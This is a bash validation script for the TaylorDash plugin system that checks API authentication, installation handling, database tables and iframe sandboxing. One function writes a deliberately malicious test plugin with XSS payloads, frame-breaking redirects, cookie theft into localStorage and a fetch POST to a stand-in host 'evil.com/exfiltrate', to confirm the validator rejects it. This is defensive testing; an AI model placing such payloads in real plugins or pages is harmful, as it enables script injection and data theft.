#!/bin/bash

# Plugin Security Validation Script
# Comprehensive testing of the TaylorDash plugin installation and security system

set -euo pipefail

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
BACKEND_DIR="$PROJECT_ROOT/backend"
API_KEY="${API_KEY:-taylordash-dev-key}"
BASE_URL="${BASE_URL:-http://localhost:8000}"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging functions
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if backend is running
check_backend_health() {
    log_info "Checking backend health..."
    
    if ! curl -s -f -H "X-API-Key: $API_KEY" "$BASE_URL/health/ready" > /dev/null; then
        log_error "Backend is not running or not healthy"
        log_info "Please start the backend with: docker-compose up backend"
        exit 1
    fi
    
    log_success "Backend is healthy"
}

# Test plugin API endpoints
test_plugin_api_endpoints() {
    log_info "Testing plugin API endpoints..."
    
    # Test list plugins endpoint
    log_info "Testing GET /api/v1/plugins/list"
    if ! curl -s -f -H "X-API-Key: $API_KEY" "$BASE_URL/api/v1/plugins/list" > /dev/null; then
        log_error "Failed to access plugins list endpoint"
        return 1
    fi
    
    # Test plugin stats endpoint
    log_info "Testing GET /api/v1/plugins/stats/overview"
    if ! curl -s -f -H "X-API-Key: $API_KEY" "$BASE_URL/api/v1/plugins/stats/overview" > /dev/null; then
        log_error "Failed to access plugin stats endpoint"
        return 1
    fi
    
    # Test registry refresh endpoint
    log_info "Testing POST /api/v1/plugins/registry/refresh"
    if ! curl -s -f -X POST -H "X-API-Key: $API_KEY" "$BASE_URL/api/v1/plugins/registry/refresh" > /dev/null; then
        log_error "Failed to refresh plugin registry"
        return 1
    fi
    
    log_success "All plugin API endpoints are accessible"
}

# Test plugin security validation
test_plugin_security_validation() {
    log_info "Testing plugin security validation..."
    
    # Create temporary test plugin with security issues
    TEMP_DIR=$(mktemp -d)
    PLUGIN_DIR="$TEMP_DIR/malicious-plugin"
    mkdir -p "$PLUGIN_DIR"
    
    # Create malicious plugin manifest
    cat > "$PLUGIN_DIR/plugin.json" << 'EOF'
{
    "id": "malicious-test-plugin",
    "name": "Malicious Test Plugin",
    "version": "1.0.0",
    "description": "Plugin for testing security validation",
    "author": "Security Tester",
    "repository": "https://github.com/test/malicious-plugin",
    "type": "ui",
    "kind": "ui",
    "entry_point": "index.html",
    "permissions": ["read:projects", "write:projects", "network:http"],
    "api_endpoints": ["/api/v1/projects"],
    "taylordash_version": "^1.0.0"
}
EOF
    
    # Create malicious HTML file
    cat > "$PLUGIN_DIR/index.html" << 'EOF'
<html>
<head>
    <script src="https://malicious.com/evil.js"></script>
</head>
<body>
    <script>
        eval("alert('xss')");
        window.parent.location = "http://evil.com";
        document.write("<img src='x' onerror='alert(1)'>");
        
        // Try to access sensitive data
        const apiKey = "sk-1234567890abcdef1234567890abcdef";
        localStorage.setItem('stolen', document.cookie);
    </script>
</body>
</html>
EOF
    
    # Create JavaScript file with more malicious patterns
    cat > "$PLUGIN_DIR/malicious.js" << 'EOF'
// Dangerous patterns that should be detected
function breakOut() {
    top.location = "http://attacker.com";
    parent.document.write("injection");
    
    // Try to access frame element
    if (window.frameElement) {
        console.log("Breaking iframe sandbox");
    }
    
    // Dynamic code execution
    const code = "alert('injected')";
    eval(code);
    new Function(code)();
    
    // Network requests to unauthorized domains
    fetch("https://evil.com/exfiltrate", {
        method: "POST",
        body: JSON.stringify({data: "stolen"})
    });
}

// Hardcoded credentials
const config = {
    password: "supersecretpassword123",
    token: "ghp_xxxxxxxxxxxxxxxxxxxx",
    secret: "very-secret-key-12345"
};
EOF
    
    log_info "Created test plugin with security issues at $PLUGIN_DIR"
    
    # Run Python security validation directly
    cd "$BACKEND_DIR"
    
    # Test the security validator
    python3 -c "
import asyncio
import sys
from pathlib import Path
sys.path.append('.')

from app.services.plugin_security import PluginSecurityValidator
from app.models.plugin import PluginManifest
import json
from unittest.mock import AsyncMock

async def test_security():
    # Mock database pool
    mock_db_pool = AsyncMock()
    validator = PluginSecurityValidator(mock_db_pool)
    
    # Load the test plugin
    plugin_dir = Path('$PLUGIN_DIR')
    manifest_path = plugin_dir / 'plugin.json'
    
    with open(manifest_path, 'r') as f:
        manifest_data = json.load(f)
    
    try:
        manifest = PluginManifest(**manifest_data)
        print(f'✓ Manifest loaded: {manifest.name}')
    except Exception as e:
        print(f'✗ Manifest validation failed: {e}')
        return False
    
    # Run security validation
    is_valid, errors, parsed_manifest = await validator.validate_plugin_installation(
        'https://github.com/test/malicious-plugin', plugin_dir
    )
    
    if is_valid:
        print('✗ Security validation failed - malicious plugin was approved!')
        return False
    else:
        print(f'✓ Security validation correctly rejected malicious plugin')
        print(f'  Found {len(errors)} security issues:')
        for error in errors[:5]:  # Show first 5 errors
            print(f'    - {error}')
        if len(errors) > 5:
            print(f'    ... and {len(errors) - 5} more')
        return True

# Run the test
result = asyncio.run(test_security())
sys.exit(0 if result else 1)
"
    
    if [ $? -eq 0 ]; then
        log_success "Plugin security validation is working correctly"
    else
        log_error "Plugin security validation failed"
        return 1
    fi
    
    # Cleanup
    rm -rf "$TEMP_DIR"
}

# Test plugin installation API
test_plugin_installation_api() {
    log_info "Testing plugin installation API..."
    
    # Test invalid repository URL
    log_info "Testing installation with invalid repository URL"
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
        -X POST \
        -H "Content-Type: application/json" \
        -H "X-API-Key: $API_KEY" \
        -d '{"repository_url": "https://invalid-url.com/repo"}' \
        "$BASE_URL/api/v1/plugins/install")
    
    if [ "$RESPONSE" -eq 422 ] || [ "$RESPONSE" -eq 400 ]; then
        log_success "Installation correctly rejected invalid repository URL"
    else
        log_warning "Installation API response: HTTP $RESPONSE (expected 400/422)"
    fi
    
    # Test non-existent repository
    log_info "Testing installation with non-existent repository"
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
        -X POST \
        -H "Content-Type: application/json" \
        -H "X-API-Key: $API_KEY" \
        -d '{"repository_url": "https://github.com/nonexistent/nonexistent-repo"}' \
        "$BASE_URL/api/v1/plugins/install")
    
    # This might return 202 (accepted) but fail during processing
    if [ "$RESPONSE" -eq 202 ] || [ "$RESPONSE" -eq 400 ] || [ "$RESPONSE" -eq 404 ]; then
        log_success "Installation API handled non-existent repository appropriately"
    else
        log_warning "Installation API response: HTTP $RESPONSE"
    fi
}

# Test API security (authentication)
test_api_security() {
    log_info "Testing API security and authentication..."
    
    # Test without API key
    log_info "Testing request without API key"
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null "$BASE_URL/api/v1/plugins/list")
    
    if [ "$RESPONSE" -eq 401 ] || [ "$RESPONSE" -eq 403 ]; then
        log_success "API correctly rejected request without API key"
    else
        log_error "API allowed unauthenticated request (HTTP $RESPONSE)"
        return 1
    fi
    
    # Test with invalid API key
    log_info "Testing request with invalid API key"
    RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null \
        -H "X-API-Key: invalid-key" \
        "$BASE_URL/api/v1/plugins/list")
    
    if [ "$RESPONSE" -eq 401 ] || [ "$RESPONSE" -eq 403 ]; then
        log_success "API correctly rejected request with invalid API key"
    else
        log_error "API allowed request with invalid API key (HTTP $RESPONSE)"
        return 1
    fi
}

# Test database schema initialization
test_database_schema() {
    log_info "Testing database schema initialization..."
    
    # Check if plugin tables exist
    if command -v docker &> /dev/null; then
        POSTGRES_CONTAINER=$(docker ps --filter "name=postgres" --format "{{.Names}}" | head -1)
        
        if [ -n "$POSTGRES_CONTAINER" ]; then
            log_info "Checking plugin database tables..."
            
            # Check if main plugin tables exist
            TABLES=$(docker exec "$POSTGRES_CONTAINER" psql -U taylordash -d taylordash -t -c "
                SELECT table_name FROM information_schema.tables 
                WHERE table_schema = 'public' 
                AND table_name LIKE 'plugin%'
                ORDER BY table_name;
            " 2>/dev/null || echo "")
            
            if echo "$TABLES" | grep -q "plugins"; then
                log_success "Plugin database schema is properly initialized"
                log_info "Found plugin tables:"
                echo "$TABLES" | sed 's/^/ /'
            else
                log_warning "Plugin database schema may not be fully initialized"
                log_info "This is normal on first run - tables will be created automatically"
            fi
        else
            log_warning "PostgreSQL container not found - skipping database schema check"
        fi
    else
        log_warning "Docker not available - skipping database schema check"
    fi
}

# Test frontend plugin registry
test_frontend_plugin_registry() {
    log_info "Testing frontend plugin registry..."
    
    REGISTRY_FILE="$PROJECT_ROOT/frontend/src/plugins/registry.ts"
    
    if [ -f "$REGISTRY_FILE" ]; then
        log_success "Frontend plugin registry file exists"
        
        # Check if registry file is valid TypeScript
        if grep -q "export const PLUGINS" "$REGISTRY_FILE"; then
            log_success "Plugin registry has correct export structure"
        else
            log_warning "Plugin registry may have incorrect structure"
        fi
        
        # Check if security function exists
        if grep -q "isPluginSecure" "$REGISTRY_FILE"; then
            log_success "Plugin registry includes security validation function"
        else
            log_warning "Plugin registry missing security validation function"
        fi
    else
        log_warning "Frontend plugin registry file not found at $REGISTRY_FILE"
        log_info "This will be created automatically when plugins are installed"
    fi
}

# Test plugin isolation and sandboxing
test_plugin_isolation() {
    log_info "Testing plugin isolation and sandboxing..."
    
    # Check if plugin iframe sandbox attributes are properly configured
    PLUGIN_PAGE="$PROJECT_ROOT/frontend/src/components/PluginPage.tsx"
    
    if [ -f "$PLUGIN_PAGE" ]; then
        if grep -q "sandbox=" "$PLUGIN_PAGE"; then
            log_success "Plugin iframe sandbox configuration found"
            
            # Check for proper sandbox restrictions
            if grep -q "allow-same-origin allow-scripts allow-forms allow-popups" "$PLUGIN_PAGE"; then
                log_success "Plugin iframe has appropriate sandbox restrictions"
            else
                log_warning "Plugin iframe sandbox may need review"
            fi
        else
            log_error "Plugin iframe missing sandbox configuration"
            return 1
        fi
    else
        log_warning "PluginPage component not found - this is required for plugin isolation"
    fi
}

# Run comprehensive validation
main() {
    log_info "Starting TaylorDash Plugin Security Validation"
    log_info "============================================="
    
    local exit_code=0
    
    # Run all tests
    check_backend_health || exit_code=1
    test_plugin_api_endpoints || exit_code=1
    test_api_security || exit_code=1
    test_plugin_security_validation || exit_code=1
    test_plugin_installation_api || exit_code=1
    test_database_schema || exit_code=1
    test_frontend_plugin_registry || exit_code=1
    test_plugin_isolation || exit_code=1
    
    echo
    log_info "============================================="
    if [ $exit_code -eq 0 ]; then
        log_success "🎉 All plugin security validation tests passed!"
        log_info "The TaylorDash plugin system is secure and ready for production use."
    else
        log_error "❌ Some plugin security validation tests failed!"
        log_info "Please review the errors above and fix any issues."
    fi
    
    exit $exit_code
}

# Run the validation if this script is executed directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi